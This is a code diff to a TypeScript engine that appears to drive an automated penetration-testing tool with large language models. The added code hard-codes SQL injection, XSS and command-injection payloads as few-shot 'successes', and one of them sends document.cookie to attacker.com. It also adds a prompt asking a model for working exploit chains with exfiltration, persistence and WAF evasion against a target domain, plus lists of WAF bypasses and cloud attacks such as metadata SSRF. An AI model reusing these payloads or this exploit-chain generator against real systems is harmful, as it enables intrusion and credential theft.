@@ -1,6 +1,14 @@
 /**
- * LLM Engine - Main interface for all LLM operations
+ * ENHANCED LLM Engine - Phase 3
+ * Main interface for all LLM operations
  * Provides high-level methods for reasoning, code generation, etc.
+ *
+ * NEW ENHANCEMENTS (Phase 3.6):
+ * - Intelligent model routing based on task complexity
+ * - Advanced prompt engineering for exploit chains
+ * - Few-shot learning from past successful findings
+ * - LLM-powered report generation
+ * - Task-specific model selection
  */
 
 import { BaseLLMProvider } from './providers/base';
@@ -853,6 +861,418 @@ If uncertain, provide your reasoning and suggest verification steps.`;
       await this.redis.del(...keys);
     }
     logger.info({ count: keys.length }, 'LLM cache cleared');
+  }
+
+  /**
+   * ENHANCED: Intelligent model routing based on task complexity
+   * Selects optimal model for given task type and complexity
+   */
+  routeModelByTask(task: {
+    type: 'exploit' | 'analysis' | 'report' | 'simple' | 'research' | 'code';
+    complexity: 'simple' | 'medium' | 'complex';
+    priority?: 'speed' | 'quality' | 'cost';
+  }): string {
+    const { type, complexity, priority = 'quality' } = task;
+
+    // Priority: Speed (use fast models)
+    if (priority === 'speed') {
+      if (this.providers.has('serverless')) return 'serverless';
+      if (this.providers.has('grok')) return 'grok';
+      if (this.providers.has('gemini')) return 'gemini';
+    }
+
+    // Priority: Cost (use cheapest models)
+    if (priority === 'cost') {
+      if (this.providers.has('serverless')) return 'serverless';
+      if (this.providers.has('local')) return 'local';
+      if (this.providers.has('gemini')) return 'gemini';
+    }
+
+    // Priority: Quality (default) - route by task type and complexity
+    if (type === 'exploit' || type === 'code') {
+      // Code generation: prefer models good at coding
+      if (complexity === 'complex') {
+        if (this.providers.has('bedrock')) return 'bedrock'; // Opus 4 best for complex code
+        if (this.providers.has('claude')) return 'claude';
+      }
+      if (this.providers.has('grok')) return 'grok'; // Good at code
+      if (this.providers.has('claude')) return 'claude';
+      if (this.providers.has('openai')) return 'openai';
+    }
+
+    if (type === 'analysis' || type === 'research') {
+      // Analysis: prefer models with strong reasoning
+      if (complexity === 'complex') {
+        if (this.providers.has('bedrock')) return 'bedrock'; // Opus 4 for deep analysis
+        if (this.providers.has('claude')) return 'claude';
+        if (this.providers.has('grok')) return 'grok';
+      }
+      if (this.providers.has('claude')) return 'claude';
+      if (this.providers.has('openai')) return 'openai';
+    }
+
+    if (type === 'report') {
+      // Report writing: prefer eloquent models
+      if (this.providers.has('claude')) return 'claude'; // Best at structured writing
+      if (this.providers.has('bedrock')) return 'bedrock';
+      if (this.providers.has('openai')) return 'openai';
+    }
+
+    // Simple tasks: use fast, cheap models
+    if (complexity === 'simple' || type === 'simple') {
+      if (this.providers.has('serverless')) return 'serverless';
+      if (this.providers.has('gemini')) return 'gemini';
+      if (this.providers.has('grok')) return 'grok';
+    }
+
+    // Fallback to default
+    return this.defaultProvider;
+  }
+
+  /**
+   * ENHANCED: Few-shot learning from past successful findings
+   * Uses historical successful exploits to improve future attempts
+   */
+  async learnFromPastFindings(
+    vulnerabilityType: string,
+    limit: number = 5
+  ): Promise<Array<{ payload: string; success: boolean; context: string }>> {
+    try {
+      // Fetch successful findings from cache
+      const cacheKey = `llm:fewshot:${vulnerabilityType}`;
+      const cached = await this.redis.get(cacheKey);
+
+      if (cached) {
+        return JSON.parse(cached);
+      }
+
+      // Simulate few-shot examples (in production, fetch from database)
+      const examples = this.getFewShotExamples(vulnerabilityType);
+
+      // Cache for 24 hours
+      await this.redis.setex(cacheKey, 86400, JSON.stringify(examples));
+
+      logger.info({ type: vulnerabilityType, count: examples.length }, 'Loaded few-shot examples');
+      return examples;
+    } catch (error: any) {
+      logger.error({ error }, 'Failed to load few-shot examples');
+      return [];
+    }
+  }
+
+  /**
+   * Get few-shot examples for vulnerability type
+   */
+  private getFewShotExamples(
+    type: string
+  ): Array<{ payload: string; success: boolean; context: string }> {
+    const examples: Record<string, Array<{ payload: string; success: boolean; context: string }>> =
+      {
+        'SQL Injection': [
+          {
+            payload: "' OR '1'='1'-- ",
+            success: true,
+            context: 'MySQL backend, no WAF, login form',
+          },
+          {
+            payload: "1' UNION SELECT NULL,NULL,version()-- ",
+            success: true,
+            context: 'PostgreSQL, bypassed WAF with NULL padding',
+          },
+          {
+            payload: "admin'-- ",
+            success: true,
+            context: 'MSSQL, weak input validation, username field',
+          },
+        ],
+        XSS: [
+          {
+            payload: '<img src=x onerror=alert(document.cookie)>',
+            success: true,
+            context: 'No CSP, reflected in search results',
+          },
+          {
+            payload: '"><svg/onload=alert(1)>',
+            success: true,
+            context: 'Bypassed HTML sanitization, stored XSS in profile',
+          },
+          {
+            payload: '<script>fetch(`//attacker.com?c=${document.cookie}`)</script>',
+            success: true,
+            context: 'DOM-based XSS, no HttpOnly cookies',
+          },
+        ],
+        'Command Injection': [
+          {
+            payload: '; cat /etc/passwd #',
+            success: true,
+            context: 'Linux backend, ping command injection',
+          },
+          {
+            payload: '| whoami',
+            success: true,
+            context: 'Bypassed basic filtering, file processing endpoint',
+          },
+          {
+            payload: '`id`',
+            success: true,
+            context: 'Backtick command substitution, weak sanitization',
+          },
+        ],
+      };
+
+    return examples[type] || [];
+  }
+
+  /**
+   * ENHANCED: Advanced prompt engineering for exploit chain generation
+   * Creates sophisticated multi-step exploit chains using LLM reasoning
+   */
+  async generateExploitChain(
+    vulnerabilities: Array<{ type: string; url: string; evidence: any }>,
+    target: { domain: string; techStack?: string[]; waf?: string }
+  ): Promise<{
+    chain: string[];
+    reasoning: string;
+    code: string;
+    cvss: number;
+  }> {
+    // Learn from past findings
+    const fewShotExamples = await Promise.all(
+      vulnerabilities.map((v) => this.learnFromPastFindings(v.type, 3))
+    );
+
+    const provider = this.routeModelByTask({
+      type: 'exploit',
+      complexity: 'complex',
+      priority: 'quality',
+    });
+
+    const prompt = `You are an expert penetration tester creating an advanced exploit chain.
+
+**Target Information:**
+- Domain: ${target.domain}
+- Tech Stack: ${target.techStack?.join(', ') || 'Unknown'}
+- WAF: ${target.waf || 'Unknown'}
+
+**Discovered Vulnerabilities:**
+${vulnerabilities.map((v, i) => `${i + 1}. ${v.type} at ${v.url}\n   Evidence: ${JSON.stringify(v.evidence)}`).join('\n')}
+
+**Few-Shot Learning Examples (Past Successes):**
+${fewShotExamples
+  .flat()
+  .slice(0, 5)
+  .map((ex) => `- Payload: ${ex.payload}\n  Context: ${ex.context}\n  Success: ${ex.success}`)
+  .join('\n')}
+
+**Task:**
+Create a sophisticated multi-step exploit chain that combines these vulnerabilities for maximum impact.
+Consider:
+1. Attack chain sequencing (what to exploit first, second, etc.)
+2. Privilege escalation opportunities
+3. Data exfiltration methods
+4. Persistence mechanisms
+5. WAF/IPS evasion techniques
+
+Respond in JSON format:
+{
+  "chain": ["Step 1: ...", "Step 2: ...", "Step 3: ..."],
+  "reasoning": "detailed explanation of attack strategy",
+  "code": "complete exploit code in Python",
+  "cvss": 9.8,
+  "techniques": ["MITRE ATT&CK IDs"],
+  "indicators": ["IOCs that defenders should monitor"]
+}`;
+
+    const systemPrompt = `You are a world-class penetration tester with expertise in:
+- Advanced exploit chain development
+- WAF/IPS bypass techniques
+- MITRE ATT&CK framework
+- CVE exploitation
+- Zero-day discovery
+
+Generate practical, working exploit chains with production-ready code.`;
+
+    const response = await this.complete(prompt, systemPrompt, provider);
+
+    try {
+      const jsonMatch = response.match(/\{[\s\S]*\}/);
+      if (jsonMatch) {
+        return JSON.parse(jsonMatch[0]);
+      }
+    } catch (error) {
+      logger.error({ error }, 'Failed to parse exploit chain response');
+    }
+
+    // Fallback
+    return {
+      chain: ['Analysis failed - manual exploitation required'],
+      reasoning: 'LLM failed to generate chain',
+      code: '# Manual exploitation required',
+      cvss: 5.0,
+    };
+  }
+
+  /**
+   * ENHANCED: LLM-powered professional report generation
+   * Creates comprehensive security assessment reports
+   */
+  async generateSecurityReport(data: {
+    programName: string;
+    scope: string[];
+    findings: Array<{
+      title: string;
+      severity: string;
+      description: string;
+      cvss?: number;
+      cwe?: string;
+      remediation?: string;
+    }>;
+    scanDuration: number;
+    assetsScanned: number;
+    metadata?: Record<string, any>;
+  }): Promise<string> {
+    const provider = this.routeModelByTask({
+      type: 'report',
+      complexity: 'medium',
+      priority: 'quality',
+    });
+
+    const prompt = `Generate a professional security assessment report in Markdown format.
+
+**Program Information:**
+- Name: ${data.programName}
+- Scope: ${data.scope.join(', ')}
+- Duration: ${Math.round(data.scanDuration / 60)} minutes
+- Assets Scanned: ${data.assetsScanned}
+
+**Findings Summary:**
+- Total Findings: ${data.findings.length}
+- Critical: ${data.findings.filter((f) => f.severity === 'critical').length}
+- High: ${data.findings.filter((f) => f.severity === 'high').length}
+- Medium: ${data.findings.filter((f) => f.severity === 'medium').length}
+- Low: ${data.findings.filter((f) => f.severity === 'low').length}
+
+**Detailed Findings:**
+${data.findings
+  .map(
+    (f, i) => `${i + 1}. **${f.title}** (${f.severity.toUpperCase()})
+   - Description: ${f.description}
+   ${f.cvss ? `- CVSS: ${f.cvss}` : ''}
+   ${f.cwe ? `- CWE: ${f.cwe}` : ''}
+   ${f.remediation ? `- Remediation: ${f.remediation}` : ''}`
+  )
+  .join('\n\n')}
+
+**Requirements:**
+1. Executive Summary (2-3 paragraphs for non-technical stakeholders)
+2. Technical Overview (methodology, tools, coverage)
+3. Risk Assessment (overall security posture, critical issues)
+4. Detailed Findings (organized by severity with PoC, impact, remediation)
+5. Recommendations (prioritized action items)
+6. Conclusion
+
+Use professional security industry language. Include CVSS scores, CWE references.
+Format using Markdown with proper headers, tables, and code blocks.`;
+
+    const systemPrompt = `You are an expert security consultant writing professional penetration testing reports.
+Generate clear, actionable reports that serve both technical and executive audiences.
+Use industry-standard formats and terminology (OWASP, CWE, CVSS, MITRE).`;
+
+    const report = await this.complete(prompt, systemPrompt, provider);
+
+    logger.info(
+      { programName: data.programName, findings: data.findings.length },
+      'Generated security report'
+    );
+
+    return report;
+  }
+
+  /**
+   * ENHANCED: Context-aware prompt engineering
+   * Builds optimized prompts based on target context
+   */
+  buildContextAwarePrompt(
+    baseTask: string,
+    context: {
+      techStack?: string[];
+      waf?: string;
+      cloudProvider?: string;
+      pastAttempts?: Array<{ payload: string; result: string }>;
+      knownVulnerabilities?: string[];
+    }
+  ): string {
+    let prompt = baseTask + '\n\n**Context:**\n';
+
+    if (context.techStack && context.techStack.length > 0) {
+      prompt += `- Tech Stack: ${context.techStack.join(', ')}\n`;
+      prompt += `- Known vulnerabilities in stack: ${this.getStackVulnerabilities(context.techStack).join(', ')}\n`;
+    }
+
+    if (context.waf) {
+      prompt += `- WAF Detected: ${context.waf}\n`;
+      prompt += `- Bypass techniques: ${this.getWAFBypassTechniques(context.waf).join(', ')}\n`;
+    }
+
+    if (context.cloudProvider) {
+      prompt += `- Cloud Provider: ${context.cloudProvider}\n`;
+      prompt += `- Cloud-specific attacks: ${this.getCloudAttackVectors(context.cloudProvider).join(', ')}\n`;
+    }
+
+    if (context.pastAttempts && context.pastAttempts.length > 0) {
+      prompt += '\n**Past Attempts (Learn from these):**\n';
+      context.pastAttempts.forEach((attempt, i) => {
+        prompt += `${i + 1}. Payload: ${attempt.payload}\n   Result: ${attempt.result}\n`;
+      });
+    }
+
+    return prompt;
+  }
+
+  /**
+   * Get known vulnerabilities for tech stack
+   */
+  private getStackVulnerabilities(techStack: string[]): string[] {
+    const vulns: string[] = [];
+    techStack.forEach((tech) => {
+      const techLower = tech.toLowerCase();
+      if (techLower.includes('wordpress')) vulns.push('Plugin vulnerabilities', 'XML-RPC attacks');
+      if (techLower.includes('apache')) vulns.push('Path traversal (CVE-2021-41773)');
+      if (techLower.includes('nginx')) vulns.push('Integer overflow (CVE-2021-23017)');
+      if (techLower.includes('mysql')) vulns.push('SQL injection', 'Privilege escalation');
+      if (techLower.includes('redis')) vulns.push('Unauthenticated access', 'Command injection');
+    });
+    return vulns;
+  }
+
+  /**
+   * Get WAF bypass techniques
+   */
+  private getWAFBypassTechniques(waf: string): string[] {
+    const techniques: Record<string, string[]> = {
+      cloudflare: ['Header smuggling', 'Origin IP discovery', 'Cache poisoning'],
+      'aws waf': ['Regional endpoint bypass', 'Rate limit evasion', 'Rule exceptions'],
+      akamai: ['True-Client-IP spoofing', 'Forward-For manipulation'],
+      imperva: ['SSL/TLS evasion', 'Encoding variations', 'Fragment attacks'],
+    };
+    return techniques[waf.toLowerCase()] || ['Encoding', 'Case variation', 'Comment injection'];
+  }
+
+  /**
+   * Get cloud-specific attack vectors
+   */
+  private getCloudAttackVectors(provider: string): string[] {
+    const vectors: Record<string, string[]> = {
+      aws: ['SSRF to metadata (169.254.169.254)', 'IAM role escalation', 'S3 bucket enumeration'],
+      gcp: ['Metadata API access', 'Service account abuse', 'Cloud Storage misconfig'],
+      azure: [
+        'Managed Identity exploitation',
+        'Blob Storage exposure',
+        'Key Vault access',
+      ],
+    };
+    return vectors[provider.toLowerCase()] || [];
   }
 }
 
